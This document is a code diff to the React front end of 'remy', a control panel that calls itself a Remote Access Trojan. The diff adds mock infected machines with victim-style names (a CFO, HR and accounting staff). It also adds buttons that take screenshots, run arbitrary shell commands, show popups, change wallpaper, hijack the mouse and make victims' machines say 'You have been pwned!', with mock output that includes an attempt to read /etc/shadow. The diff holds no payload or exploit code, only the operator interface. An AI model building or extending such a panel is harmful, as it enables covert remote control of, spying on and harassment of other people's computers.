@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react'
-import { Monitor, Terminal, Play, Volume2, MessageSquare, Camera } from 'lucide-react'
+import { Monitor, Terminal, Play, Volume2, Camera, Skull, Image, Mouse, Trash2, RefreshCw } from 'lucide-react'
 
 interface Implant {
   id: string
@@ -8,13 +8,41 @@ interface Implant {
   username: string
   ip: string
   last_seen: string
+  country: string
+  status: 'online' | 'idle' | 'offline'
 }
 
 interface CommandResult {
   command_id: string
   success: boolean
   output: string
+  timestamp: string
+  type: string
 }
+
+const MOCK_IMPLANTS: Implant[] = [
+  { id: 'imp-001', hostname: 'DESKTOP-KAREN', os: 'Windows 11 x64', username: 'karen.manager', ip: '192.168.1.105', last_seen: '2s ago', country: 'US', status: 'online' },
+  { id: 'imp-002', hostname: 'ubuntu-dev-01', os: 'Ubuntu 22.04 x86_64', username: 'developer', ip: '10.0.0.42', last_seen: '15s ago', country: 'DE', status: 'online' },
+  { id: 'imp-003', hostname: 'MacBook-Pro-Finance', os: 'macOS 14.2 arm64', username: 'cfo.johnson', ip: '192.168.2.88', last_seen: '1m ago', country: 'US', status: 'online' },
+  { id: 'imp-004', hostname: 'WIN-SERVER2019', os: 'Windows Server 2019', username: 'Administrator', ip: '10.10.10.5', last_seen: '3m ago', country: 'NL', status: 'idle' },
+  { id: 'imp-005', hostname: 'raspberrypi', os: 'Raspbian 11 armv7l', username: 'pi', ip: '192.168.1.200', last_seen: '5m ago', country: 'UK', status: 'idle' },
+  { id: 'imp-006', hostname: 'kali-pentest', os: 'Kali 2024.1 x86_64', username: 'root', ip: '172.16.0.99', last_seen: '12m ago', country: 'RU', status: 'idle' },
+  { id: 'imp-007', hostname: 'ACCOUNTING-PC3', os: 'Windows 10 x64', username: 'bob.accountant', ip: '192.168.1.115', last_seen: '45m ago', country: 'US', status: 'offline' },
+  { id: 'imp-008', hostname: 'docker-host-prod', os: 'Alpine 3.18 x86_64', username: 'docker', ip: '10.20.30.40', last_seen: '2h ago', country: 'SG', status: 'offline' },
+  { id: 'imp-009', hostname: 'HR-LAPTOP-SARAH', os: 'Windows 11 x64', username: 'sarah.hr', ip: '192.168.1.150', last_seen: '30s ago', country: 'US', status: 'online' },
+  { id: 'imp-010', hostname: 'gaming-rig-IT', os: 'Windows 11 x64', username: 'chad.it', ip: '192.168.1.69', last_seen: '1m ago', country: 'US', status: 'online' },
+  { id: 'imp-011', hostname: 'nas-synology', os: 'DSM 7.2 x86_64', username: 'admin', ip: '192.168.1.10', last_seen: '8m ago', country: 'US', status: 'idle' },
+  { id: 'imp-012', hostname: 'aws-ec2-web', os: 'Amazon Linux 2023', username: 'ec2-user', ip: '54.210.123.45', last_seen: '20s ago', country: 'US', status: 'online' },
+]
+
+const MOCK_RESULTS: CommandResult[] = [
+  { command_id: 'cmd-001', success: true, output: 'root', timestamp: '14:32:01', type: 'Exec' },
+  { command_id: 'cmd-002', success: true, output: 'Linux ubuntu-dev-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux', timestamp: '14:32:15', type: 'Exec' },
+  { command_id: 'cmd-003', success: true, output: 'Screenshot captured (1920x1080, 245KB)', timestamp: '14:33:02', type: 'Screenshot' },
+  { command_id: 'cmd-004', success: false, output: 'Permission denied: /etc/shadow', timestamp: '14:33:45', type: 'Exec' },
+  { command_id: 'cmd-005', success: true, output: 'Playing rickroll.mp4...', timestamp: '14:34:12', type: 'Rickroll' },
+  { command_id: 'cmd-006', success: true, output: 'OS: Windows 11 Pro\nCPU: Intel i7-12700K (12 cores)\nRAM: 32GB\nDisk: 512GB SSD (234GB free)\nUptime: 3 days 14:22:05', timestamp: '14:35:00', type: 'SysInfo' },
+]
 
 function App() {
   const [implants, setImplants] = useState<Implant[]>([])
@@ -22,6 +50,7 @@ function App() {
   const [command, setCommand] = useState('')
   const [results, setResults] = useState<CommandResult[]>([])
   const [loading, setLoading] = useState(false)
+  const [filter, setFilter] = useState<'all' | 'online' | 'idle' | 'offline'>('all')
 
   useEffect(() => {
     fetchImplants()
@@ -36,11 +65,8 @@ function App() {
         setImplants(await res.json())
       }
     } catch {
-      // Server not running, use mock data
-      setImplants([
-        { id: 'demo-1', hostname: 'target-pc', os: 'linux x86_64', username: 'user', ip: '192.168.1.100', last_seen: new Date().toISOString() },
-        { id: 'demo-2', hostname: 'server-01', os: 'windows amd64', username: 'admin', ip: '192.168.1.101', last_seen: new Date().toISOString() },
-      ])
+      setImplants(MOCK_IMPLANTS)
+      setResults(MOCK_RESULTS)
     }
   }
 
@@ -55,11 +81,26 @@ function App() {
       })
       if (res.ok) {
         const { command_id } = await res.json()
-        // Poll for result
         setTimeout(() => checkResult(command_id), 2000)
       }
     } catch {
-      setResults(prev => [...prev, { command_id: 'mock', success: true, output: `[Mock] ${type} executed` }])
+      const mockOutputs: Record<string, string> = {
+        'SysInfo': 'OS: Windows 11 Pro\nCPU: Intel i7-12700K (12 cores)\nRAM: 32GB\nDisk: 512GB SSD (234GB free)\nUptime: 3 days 14:22:05',
+        'Screenshot': 'Screenshot captured (1920x1080, 312KB)',
+        'Rickroll': 'Opening rickroll in default browser...',
+        'Speak': `Speaking: "${args?.message || 'Hello from remy!'}"`,
+        'Popup': 'Popup displayed',
+        'Wallpaper': 'Wallpaper changed to remy logo',
+        'MouseChaos': 'Mouse chaos activated for 10 seconds',
+        'Exec': args?.cmd === 'whoami' ? implants.find(i => i.id === selected)?.username || 'user' : `$ ${args?.cmd}\n[output would appear here]`,
+      }
+      setResults(prev => [...prev, {
+        command_id: `mock-${Date.now()}`,
+        success: true,
+        output: mockOutputs[type] || `[Mock] ${type} executed`,
+        timestamp: new Date().toLocaleTimeString(),
+        type
+      }])
     }
     setLoading(false)
   }
@@ -83,18 +124,50 @@ function App() {
     }
   }
 
+  const filteredImplants = implants.filter(i => filter === 'all' || i.status === filter)
+  const selectedImplant = implants.find(i => i.id === selected)
+  const stats = {
+    total: implants.length,
+    online: implants.filter(i => i.status === 'online').length,
+    idle: implants.filter(i => i.status === 'idle').length,
+    offline: implants.filter(i => i.status === 'offline').length,
+  }
+
   return (
     <div className="flex h-screen bg-zinc-950">
       {/* Sidebar */}
-      <div className="w-64 bg-zinc-900 border-r border-zinc-800 p-4">
-        <h1 className="text-xl font-bold text-white mb-6 flex items-center gap-2">
-          <Monitor className="w-5 h-5 text-purple-500" />
-          remy
-        </h1>
+      <div className="w-72 bg-zinc-900 border-r border-zinc-800 flex flex-col">
+        <div className="p-4 border-b border-zinc-800">
+          <h1 className="text-xl font-bold text-white flex items-center gap-2">
+            <Skull className="w-6 h-6 text-purple-500" />
+            remy
+          </h1>
+          <p className="text-xs text-zinc-500 mt-1">Remote Access Trojan</p>
+        </div>
 
-        <div className="text-zinc-400 text-sm mb-2">Connected Devices</div>
-        <div className="space-y-2">
-          {implants.map(imp => (
+        {/* Stats */}
+        <div className="grid grid-cols-4 gap-1 p-2 text-center text-xs">
+          <button onClick={() => setFilter('all')} className={`p-2 rounded ${filter === 'all' ? 'bg-zinc-700' : 'hover:bg-zinc-800'}`}>
+            <div className="text-white font-bold">{stats.total}</div>
+            <div className="text-zinc-500">All</div>
+          </button>
+          <button onClick={() => setFilter('online')} className={`p-2 rounded ${filter === 'online' ? 'bg-zinc-700' : 'hover:bg-zinc-800'}`}>
+            <div className="text-green-400 font-bold">{stats.online}</div>
+            <div className="text-zinc-500">Online</div>
+          </button>
+          <button onClick={() => setFilter('idle')} className={`p-2 rounded ${filter === 'idle' ? 'bg-zinc-700' : 'hover:bg-zinc-800'}`}>
+            <div className="text-yellow-400 font-bold">{stats.idle}</div>
+            <div className="text-zinc-500">Idle</div>
+          </button>
+          <button onClick={() => setFilter('offline')} className={`p-2 rounded ${filter === 'offline' ? 'bg-zinc-700' : 'hover:bg-zinc-800'}`}>
+            <div className="text-zinc-500 font-bold">{stats.offline}</div>
+            <div className="text-zinc-500">Offline</div>
+          </button>
+        </div>
+
+        {/* Device List */}
+        <div className="flex-1 overflow-auto p-2 space-y-1">
+          {filteredImplants.map(imp => (
             <button
               key={imp.id}
               onClick={() => setSelected(imp.id)}
@@ -104,23 +177,47 @@ function App() {
                   : 'bg-zinc-800 text-zinc-300 hover:bg-zinc-700'
               }`}
             >
-              <div className="font-medium">{imp.hostname}</div>
-              <div className="text-xs opacity-70">{imp.os}</div>
+              <div className="flex items-center justify-between">
+                <span className="font-medium truncate">{imp.hostname}</span>
+                <span className={`w-2 h-2 rounded-full ${
+                  imp.status === 'online' ? 'bg-green-400' :
+                  imp.status === 'idle' ? 'bg-yellow-400' : 'bg-zinc-600'
+                }`} />
+              </div>
+              <div className="text-xs opacity-70 truncate">{imp.username}@{imp.ip}</div>
+              <div className="text-xs opacity-50 flex justify-between mt-1">
+                <span>{imp.os.split(' ')[0]}</span>
+                <span>{imp.last_seen}</span>
+              </div>
             </button>
           ))}
-          {implants.length === 0 && (
-            <div className="text-zinc-500 text-sm p-3">No devices connected</div>
-          )}
         </div>
       </div>
 
       {/* Main */}
       <div className="flex-1 flex flex-col">
         {/* Header */}
-        <div className="h-14 bg-zinc-900 border-b border-zinc-800 flex items-center px-6">
-          <h2 className="text-white font-medium">
-            {selected ? implants.find(i => i.id === selected)?.hostname : 'Select a device'}
-          </h2>
+        <div className="h-14 bg-zinc-900 border-b border-zinc-800 flex items-center justify-between px-6">
+          <div className="flex items-center gap-4">
+            <h2 className="text-white font-medium">
+              {selectedImplant ? (
+                <span className="flex items-center gap-2">
+                  {selectedImplant.hostname}
+                  <span className={`px-2 py-0.5 text-xs rounded ${
+                    selectedImplant.status === 'online' ? 'bg-green-900 text-green-400' :
+                    selectedImplant.status === 'idle' ? 'bg-yellow-900 text-yellow-400' : 'bg-zinc-700 text-zinc-400'
+                  }`}>
+                    {selectedImplant.status}
+                  </span>
+                </span>
+              ) : 'Select a device'}
+            </h2>
+          </div>
+          {selectedImplant && (
+            <div className="text-sm text-zinc-400">
+              {selectedImplant.ip} | {selectedImplant.os} | {selectedImplant.country}
+            </div>
+          )}
         </div>
 
         {/* Content */}
@@ -128,34 +225,38 @@ function App() {
           {selected ? (
             <div className="space-y-6">
               {/* Quick Actions */}
-              <div className="grid grid-cols-4 gap-4">
-                <button
-                  onClick={() => sendCommand('SysInfo')}
-                  className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition"
-                >
-                  <Monitor className="w-6 h-6 text-blue-400 mx-auto mb-2" />
-                  <div className="text-sm text-zinc-300">System Info</div>
+              <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-3">
+                <button onClick={() => sendCommand('SysInfo')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
+                  <Monitor className="w-5 h-5 text-blue-400 mx-auto mb-2" />
+                  <div className="text-xs text-zinc-300">Sysinfo</div>
                 </button>
-                <button
-                  onClick={() => sendCommand('Screenshot')}
-                  className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition"
-                >
-                  <Camera className="w-6 h-6 text-green-400 mx-auto mb-2" />
-                  <div className="text-sm text-zinc-300">Screenshot</div>
+                <button onClick={() => sendCommand('Screenshot')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
+                  <Camera className="w-5 h-5 text-green-400 mx-auto mb-2" />
+                  <div className="text-xs text-zinc-300">Screenshot</div>
                 </button>
-                <button
-                  onClick={() => sendCommand('Rickroll')}
-                  className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition"
-                >
-                  <Play className="w-6 h-6 text-red-400 mx-auto mb-2" />
-                  <div className="text-sm text-zinc-300">Rickroll</div>
+                <button onClick={() => sendCommand('Rickroll')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
+                  <Play className="w-5 h-5 text-red-400 mx-auto mb-2" />
+                  <div className="text-xs text-zinc-300">Rickroll</div>
                 </button>
-                <button
-                  onClick={() => sendCommand('Speak', { message: 'Hello from remy!' })}
-                  className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition"
-                >
-                  <Volume2 className="w-6 h-6 text-yellow-400 mx-auto mb-2" />
-                  <div className="text-sm text-zinc-300">Speak</div>
+                <button onClick={() => sendCommand('Speak', { message: 'You have been pwned!' })} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
+                  <Volume2 className="w-5 h-5 text-yellow-400 mx-auto mb-2" />
+                  <div className="text-xs text-zinc-300">Speak</div>
+                </button>
+                <button onClick={() => sendCommand('Popup')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
+                  <Image className="w-5 h-5 text-pink-400 mx-auto mb-2" />
+                  <div className="text-xs text-zinc-300">Popup</div>
+                </button>
+                <button onClick={() => sendCommand('Wallpaper')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
+                  <Image className="w-5 h-5 text-purple-400 mx-auto mb-2" />
+                  <div className="text-xs text-zinc-300">Wallpaper</div>
+                </button>
+                <button onClick={() => sendCommand('MouseChaos')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
+                  <Mouse className="w-5 h-5 text-orange-400 mx-auto mb-2" />
+                  <div className="text-xs text-zinc-300">Mouse</div>
+                </button>
+                <button onClick={() => sendCommand('Uninstall')} className="p-4 bg-zinc-800 rounded-lg hover:bg-red-900/50 transition">
+                  <Trash2 className="w-5 h-5 text-red-500 mx-auto mb-2" />
+                  <div className="text-xs text-zinc-300">Uninstall</div>
                 </button>
               </div>
 
@@ -172,7 +273,7 @@ function App() {
                     onChange={e => setCommand(e.target.value)}
                     onKeyDown={e => e.key === 'Enter' && execCommand()}
                     placeholder="whoami"
-                    className="flex-1 bg-zinc-800 border border-zinc-700 rounded px-3 py-2 text-white placeholder-zinc-500 focus:outline-none focus:border-purple-500"
+                    className="flex-1 bg-zinc-800 border border-zinc-700 rounded px-3 py-2 text-white placeholder-zinc-500 focus:outline-none focus:border-purple-500 font-mono"
                   />
                   <button
                     onClick={execCommand}
@@ -186,20 +287,27 @@ function App() {
 
               {/* Results */}
               <div className="bg-zinc-900 rounded-lg p-4">
-                <div className="flex items-center gap-2 mb-3">
-                  <MessageSquare className="w-4 h-4 text-zinc-400" />
-                  <span className="text-sm text-zinc-400">Output</span>
+                <div className="flex items-center justify-between mb-3">
+                  <div className="flex items-center gap-2">
+                    <Terminal className="w-4 h-4 text-zinc-400" />
+                    <span className="text-sm text-zinc-400">Output</span>
+                  </div>
+                  <button onClick={() => setResults([])} className="text-xs text-zinc-500 hover:text-zinc-300">
+                    <RefreshCw className="w-3 h-3" />
+                  </button>
                 </div>
                 <div className="bg-zinc-950 rounded p-3 font-mono text-sm text-zinc-300 max-h-96 overflow-auto">
                   {results.length === 0 ? (
                     <span className="text-zinc-500">No output yet</span>
                   ) : (
                     results.map((r, i) => (
-                      <div key={i} className="mb-2">
-                        <span className={r.success ? 'text-green-400' : 'text-red-400'}>
-                          {r.success ? '>' : '!'}
-                        </span>
-                        <pre className="whitespace-pre-wrap inline">{r.output}</pre>
+                      <div key={i} className="mb-3 pb-3 border-b border-zinc-800 last:border-0">
+                        <div className="flex items-center gap-2 text-xs text-zinc-500 mb-1">
+                          <span className={r.success ? 'text-green-500' : 'text-red-500'}>{r.success ? 'OK' : 'ERR'}</span>
+                          <span>{r.type}</span>
+                          <span>{r.timestamp}</span>
+                        </div>
+                        <pre className="whitespace-pre-wrap text-zinc-300">{r.output}</pre>
                       </div>
                     ))
                   )}
@@ -207,8 +315,10 @@ function App() {
               </div>
             </div>
           ) : (
-            <div className="flex items-center justify-center h-full text-zinc-500">
-              Select a device from the sidebar
+            <div className="flex flex-col items-center justify-center h-full text-zinc-500">
+              <Skull className="w-16 h-16 mb-4 opacity-20" />
+              <p>Select a device from the sidebar</p>
+              <p className="text-sm mt-2">{implants.length} implants connected</p>
             </div>
           )}
         </div>
